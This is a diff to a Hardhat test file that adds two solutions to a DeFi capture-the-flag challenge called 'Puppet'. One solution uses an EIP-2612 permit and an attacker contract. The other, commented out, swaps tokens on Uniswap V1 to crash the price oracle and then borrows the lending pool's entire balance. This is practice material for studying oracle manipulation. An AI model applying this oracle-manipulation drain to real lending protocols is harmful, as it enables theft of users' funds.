@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,6 +96,47 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Solution #2 - 1 TX, EIP-2612 https://eips.ethereum.org/EIPS/eip-2612
+        const attackerAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: 0
+        });
+        const result = await signERC2612Permit(player, token.address, player.address, attackerAddress, PLAYER_INITIAL_TOKEN_BALANCE.toString())
+        await (await ethers.getContractFactory('Attacker8', player)).deploy(
+            token.address,
+            player.address,
+            uniswapExchange.address,
+            lendingPool.address,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            ethers.constants.MaxUint256,
+            result.v,
+            result.r,
+            result.s,
+            {value: 20n*10n**18n}
+        );
+
+        // Solution #1 - 3 TXs
+        /*
+        // 1. Approve Token to Uniswap Exchange
+        console.log("deposit required:", (await lendingPool.connect(player).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)).toString())
+        await token.connect(player).approve(
+            uniswapExchange.address,
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+
+        // 2. Swap, Convert Token to ETH
+        await uniswapExchange.connect(player).tokenToEthSwapInput(
+            PLAYER_INITIAL_TOKEN_BALANCE, // tokens_sold
+            1, // min_eth > 0
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+        )
+        console.log("player's balance after swap:", (await ethers.provider.getBalance(player.address)).toString())
+        console.log("deposit required:", (await lendingPool.connect(player).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)).toString())
+        
+        // 3. Borrow
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: 20n*10n**18n})
+        console.log("pool eth:", (await ethers.provider.getBalance(lendingPool.address)).toString())
+        */
     });
 
     after(async function () {
